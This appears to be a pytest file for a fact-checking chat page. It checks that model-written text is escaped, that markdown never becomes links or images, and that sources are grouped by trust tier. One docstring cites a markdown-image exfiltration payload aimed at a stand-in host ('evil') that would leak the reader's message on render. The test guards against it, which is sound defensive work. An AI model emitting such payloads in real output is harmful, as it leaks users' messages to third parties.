"""The chat page, checked as text. Free — no browser, no network.

There is no JS runtime here, so these are structural pins, not behaviour: they
catch the class of regression where a rewrite quietly drops something that
cost real money or real trust to get right. Anything genuinely behavioural
(does the stream render? does a reload resume?) is proved by
`scripts/serve_demo.py`, which runs this exact file against the real API for
$0.

Two of these — the markdown subset and the escaping — are the page's half of
invariant 3: the model's prose is never a receipt.
"""
import re
from pathlib import Path

import pytest

PAGE = (Path(__file__).resolve().parent.parent / "static" / "index.html"
        ).read_text(encoding="utf-8")


# -- invariant 3: prose is never a receipt ------------------------------------

def test_the_markdown_renderer_never_emits_a_link_or_an_image():
    """The model can write a convincing fake URL in markdown. It renders as
    text; links come only from the structured `sources` the API returned.
    A markdown IMAGE would be worse than a wrong link — `![](https://evil/?m=…)`
    fires on render and leaks the reader's message to a third party."""
    md = PAGE[PAGE.index("function md("):PAGE.index("// -- the current turn")]
    for forbidden in ("<a ", "<img", "href=", "src="):
        assert forbidden not in md, f"md() can emit {forbidden}"


def test_everything_model_written_goes_through_esc():
    """`esc()` before interpolation, everywhere. innerHTML with unescaped
    model output is how prose becomes markup."""
    assert "function esc(s)" in PAGE
    for ch in ("&amp;", "&lt;", "&gt;", "&quot;", "&#39;"):
        assert ch in PAGE, f"esc() does not cover {ch}"
    # The inline formatter escapes FIRST and only then promotes markdown, so
    # every tag in the output is one the page put there.
    inline = PAGE[PAGE.index("const inline ="):PAGE.index("const out = [];")]
    assert inline.index("esc(t)") < inline.index("<strong>")


def test_source_urls_are_scheme_checked_before_becoming_hrefs():
    assert "function safeUrl(u)" in PAGE
    assert 'p.protocol === "https:"' in PAGE
    assert 'p.protocol === "http:"' in PAGE
    # A URL that fails the check must still render — as a non-clickable chip,
    # not vanish. A source we cannot link is still a source we cited.
    drawer = PAGE[PAGE.index("function drawSources("):PAGE.index("function drawFooter(")]
    assert "safeUrl(s.url)" in drawer
    assert '<div class="src">' in drawer


def test_the_user_message_is_set_as_text_never_as_markup():
    """A forward is attacker-controlled text; it is echoed back verbatim."""
    assert "mine.textContent = report.input_text" in PAGE


# -- invariant 4 + the tier label ---------------------------------------------

def test_machine_read_text_is_shown_back():
    assert "function showHeard(" in PAGE
    assert "What I read from what you sent" in PAGE
    assert "showHeard(report.source_text)" in PAGE


def test_the_web_tier_is_divided_off_not_blended_in():
    """Merged into one blob, a random blog reads as if it carried a
    fact-checker's authority."""
    assert "No fact-checker has covered this" in PAGE
    draw = PAGE[PAGE.index("function drawAnswer("):PAGE.index("function drawSources(")]
    assert "turn.seenWeb" in draw
    assert draw.index("md(turn.text.trusted)") < draw.index("tierline")


def test_confidence_is_always_shown_with_its_basis():
    """A bare 82% invites the reader to trust the number instead of the
    evidence. It never appears without the tier that produced it."""
    foot = PAGE[PAGE.index("function drawFooter("):PAGE.index("// -- transport")]
    assert "% confident" in foot
    assert "Confidence not stated" in foot        # None is a real value
    assert "no fact-checker has covered this" in foot
    assert "nothing reliable addressed this" in foot


def test_the_basis_counts_each_tier_on_its_own():
    """Found by review: the count was of ALL sources, printed under the
    answer's own label — so "2 trusted sources" appeared for an answer whose
    second source was listed below under "General web". The basis line is a
    claim about the evidence, so it counts what it names."""
    foot = PAGE[PAGE.index("function drawFooter("):PAGE.index("// -- transport")]
    assert 's.tier === "trusted"' in foot, "the basis does not separate the tiers"
    assert "sources.length - trusted" in foot


def test_a_source_chip_never_shows_a_raw_url_as_its_name():
    """Same rule as Source.display_name on the server. Falling through to the
    raw URL puts a 90-character tracking link where 'boomlive.in' belongs."""
    assert "function displayName(s)" in PAGE
    assert 'new URL(s.url).hostname.replace(/^www\\./, "")' in PAGE
    drawer = PAGE[PAGE.index("function drawSources("):PAGE.index("function drawFooter(")]
    assert "displayName(s)" in drawer
    assert "s.publisher || s.url" not in drawer


def test_sources_are_grouped_by_tier():
    drawer = PAGE[PAGE.index("function drawSources("):PAGE.index("function drawFooter(")]
    assert "Fact-checkers & official sources" in drawer
    assert "General web — not fact-checkers" in drawer


# -- transport: the parts that cost money to get right ------------------------

def test_a_bare_link_goes_to_the_link_endpoint():
    assert "const LINK_RE = /^https:" in PAGE
    assert PAGE.index("LINK_RE.test(text)") < PAGE.index('fetch("api/v1/verify/text"')


def test_submit_takes_a_factory_so_the_busy_guard_runs_first():
    """`submit(fetch(...))` would dispatch the request while evaluating the
    argument — i.e. before the busy check — so a double click could spend
    twice."""
    assert "async function submit(makeRequest" in PAGE
    assert "await makeRequest()" in PAGE
    # Every call site must pass a thunk. Comments are stripped first — the
    # code near here NAMES the anti-pattern in order to explain it, and a
    # naive substring search flagged the explanation instead of a bug.
    code = "\n".join(ln for ln in PAGE.splitlines()
                     if not ln.lstrip().startswith(("//", "*")))
    sites = re.findall(r"(?<!function )submit\(([^,]*?)(?:,|$)", code)
    assert len(sites) >= 3, f"expected text/link/file call sites, found {sites}"
    for site in sites:
        assert site.startswith("() =>"), f"submit() called with a live promise: {site}"


def test_a_busy_submission_is_never_silently_swallowed():
    """The file pickers clear their input before submitting, so a silent
    return threw the user's pick away with no feedback at all."""
    body = PAGE[PAGE.index("async function submit("):PAGE.index("// Resume on load")]
    assert "if (busy)" in body
    assert "Ek check pehle se chal raha hai" in body


def test_the_file_inputs_are_disabled_while_busy():
    """A disabled input fires no change event, so a picker that returns
    mid-request cannot submit at all."""
    setter = PAGE[PAGE.index("function setBusy("):PAGE.index("// Takes a FACTORY")]
    for control in ("check", "pickImage", "pickMedia", "image", "media"):
        assert f'"{control}"' in setter


def test_a_job_survives_a_reload():
    """A long check outlives the page: a reload resumes the SAME job rather
    than stranding an answer that was already paid for."""
    assert "function jobFromHash()" in PAGE
    assert "resumeFromHash" in PAGE
    assert 'location.hash = "job=" + jobId' in PAGE


def test_a_dead_job_clears_its_hash_instead_of_looping():
    """A 404 is an ANSWER, not a dropped connection. Treating it as
    'retrying…' trapped the page in a 4-minute loop that a refresh restarted
    identically."""
    assert "class GoneError" in PAGE
    assert "resp.status === 404" in PAGE
    assert "history.replaceState(null, \"\", location.pathname" in PAGE


def test_the_stream_is_a_preview_and_the_stored_answer_is_canonical():
    """Invariant 8: streamed text and stored text can never drift, because
    the page always re-renders from /reports/{job_id} when the stream ends."""
    track = PAGE[PAGE.index("async function track("):PAGE.index("function render(")]
    assert track.index("await follow(jobId)") < track.index("await poll(jobId)")
    assert "render(report)" in track


def test_streaming_degrades_to_polling():
    """EventSource may be missing, blocked by a proxy, or cut mid-answer. None
    of those may lose an answer that has already been paid for."""
    follow = PAGE[PAGE.index("function follow("):PAGE.index("async function track(")]
    assert 'typeof EventSource === "undefined"' in follow
    assert "resolve(false)" in follow
    assert "es.onerror" in follow


def test_a_stream_that_never_ends_cannot_strand_the_page():
    """MEASURED: an ASR failure stored a FAILED answer and closed nothing, so
    the page sat on heartbeats forever showing "Checking…" for a failure
    already in the database. The server side is fixed, but a client with no
    deadline makes every future not-published bug invisible in the same way —
    and the deadline is what restores poll()'s 4-minute cap."""
    follow = PAGE[PAGE.index("function follow("):PAGE.index("async function track(")]
    assert "setTimeout(() => finish(false), POLL_MS * POLL_MAX)" in follow
    assert "clearTimeout(deadline)" in follow
    # Declared before the timeout arms it — not relying on the temporal dead
    # zone resolving in time.
    assert follow.index("const finish =") < follow.index("deadline = setTimeout")


def test_the_composer_is_direction_aware():
    """Most of the people this is for type in Devanagari. dir="auto" must sit
    on the element holding their text — measured before: an outer dir="auto"
    was inert because an English label was the first strong character."""
    composer = PAGE[PAGE.index('<textarea id="text"'):PAGE.index("</textarea>")]
    assert 'dir="auto"' in composer


# -- rendering the whole thing ------------------------------------------------

def test_the_page_is_utf8_and_direction_aware():
    assert 'charset="utf-8"' in PAGE.lower()
    # dir="auto" must sit on the element holding the USER's text, not on an
    # ancestor whose first strong character is an English label — measured:
    # an outer dir="auto" was inert for exactly that reason.
    assert 'dir="auto"' in PAGE
    assert 'turn.answer.setAttribute("dir", "auto")' in PAGE


def test_the_page_declares_both_themes():
    assert "prefers-color-scheme: dark" in PAGE
    assert "--bg:" in PAGE


@pytest.mark.parametrize("gone", ["overall_rating", "claim_verdicts",
                                  "localized", "RATING_BADGE", "UNVERIFIED"])
def test_no_truth_report_leftovers(gone):
    assert gone not in PAGE


# -- the reader picks a language, and skims a summary (2026-09-23) ------------

def test_the_language_chooser_offers_buttons_and_a_free_text_box():
    """Vinayak: "give like some options with buttons and also a text box to
    enter their desired language if it is not in the button"."""
    row = PAGE[PAGE.index('<div class="langs"'):PAGE.index("<textarea")]
    assert 'data-lang=""' in row                      # the default: same as sent
    for offered in ("English", "Hindi", "Hinglish", "Marathi", "Bengali"):
        assert f'data-lang="{offered}"' in row
    assert 'id="langOther"' in row and "maxlength=\"40\"" in row
    assert 'aria-label="Answer in another language"' in row


def test_every_submission_carries_the_chosen_language():
    """Text, link and both uploads — a language that reaches only some of
    them is worse than none: the answer's language would depend on how it
    was sent."""
    assert PAGE.count("language: replyLanguage") == 2      # text + link, JSON
    assert 'fd.append("language", replyLanguage)' in PAGE  # image + voice, form
    assert 'localStorage.getItem("iv.lang")' in PAGE       # remembered per browser


def test_a_browser_without_storage_still_works():
    """Private mode throws on localStorage; the page must not die on it."""
    for line in PAGE.splitlines():
        if "localStorage" in line and "catch" not in line:
            assert "rememberLanguage" in line or "try {" in line, line


def test_the_summary_is_drawn_from_the_field_and_escaped():
    """It is a structured field, like the confidence: never scraped out of
    the prose, and never rendered as markup."""
    body = PAGE[PAGE.index("function drawSummary("):PAGE.index("function drawSources(")]
    assert "esc(text)" in body
    assert "report.summary" in PAGE                        # canonical re-render
    assert 'es.addEventListener("summary"' in PAGE         # and live
